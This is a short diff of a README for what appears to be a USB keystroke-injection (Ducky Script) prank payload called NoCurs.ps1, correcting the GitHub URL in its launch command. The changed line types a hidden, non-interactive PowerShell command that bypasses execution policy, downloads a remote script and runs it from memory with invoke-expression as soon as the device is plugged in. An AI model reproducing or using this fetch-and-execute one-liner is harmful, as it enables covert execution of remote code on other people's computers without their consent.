@@ -19,7 +19,7 @@ The NoCurs.ps1 will then
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 ```
-STRINGLN powershell -w h -NoP -NonI -Exec Bypass $d = iwr https://raw.githubusercontent.com/CE-Red/RD-NoCursor/NoCurs.ps1?dl=1; invoke-expression $d
+STRINGLN powershell -w h -NoP -NonI -Exec Bypass $d = iwr https://raw.githubusercontent.com/CE-Red/RD-NoCursor/main/NoCurs.ps1?dl=1; invoke-expression $d
 ```
 
 ## Method B64
